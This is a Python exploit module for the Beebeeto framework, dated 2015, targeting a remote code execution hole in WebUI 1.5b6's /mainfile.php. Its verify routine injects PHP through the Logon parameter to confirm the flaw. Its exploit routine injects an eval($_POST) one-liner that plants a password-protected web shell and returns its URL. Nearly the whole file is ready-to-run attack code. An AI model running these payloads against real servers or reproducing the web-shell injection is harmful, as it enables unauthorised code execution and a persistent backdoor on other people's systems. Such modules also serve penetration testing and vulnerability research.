#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        'poc':{
            'id': 'poc-2015-0094',
            'name': 'WebUI 1.5b6 /mainfile.php 远程代码执行漏洞 POC & Exploit',
            'author': '7rac3',
            'create_date': '2015-4-27',
        },
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        'vul':{
            'app_name': 'WebUI',
            'vul_version': ['1.5b6'],
            'type': 'Code Execution',
            'tag': ['WebUI漏洞', '/mainfile.php', 'Remote Code Execution Vulnerability', 'php'],
            'desc': 'WebUI 1.5b6 has code execution in mainfile.php',
            'references': ['https://www.exploit-db.com/exploits/36821/',
            ],
        },
    }

    @classmethod
    def verify(cls,args):
        target = args['options']['target']
        payload = '/mainfile.php?username=RCE&password=BB2&_login=1&Logon=%27;echo%20md5(111);%27'
        vul_url = target + payload
        if args['options']['verbose']:
            print '[*] Request URL: '+ vul_url
        response = requests.get(vul_url)
        text = response.content
        if '698d51a19d8a121ce581499d7b701668' in text:
            args['success'] = True
            args['poc_ret']['vul_url'] = vul_url
        return args


    @classmethod
    def exploit(cls,args):
        target = args['options']['target']
        payload = '/mainfile.php?username=RCE&password=BB2&_login=1&Logon=%27;echo%20md5(111);@eval($_POST[bb2]);%27'
        vul_url = target + payload
        if args['options']['verbose']:
            print '[*] Request URL: '+ vul_url
        response = requests.get(vul_url)
        text = response.content
        if '698d51a19d8a121ce581499d7b701668' in text:
            args['success'] = True
            args['poc_ret']['webshell'] = vul_url
            args['poc_ret']['password'] = 'bb2'
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = Mypoc()
    pprint(mp.run())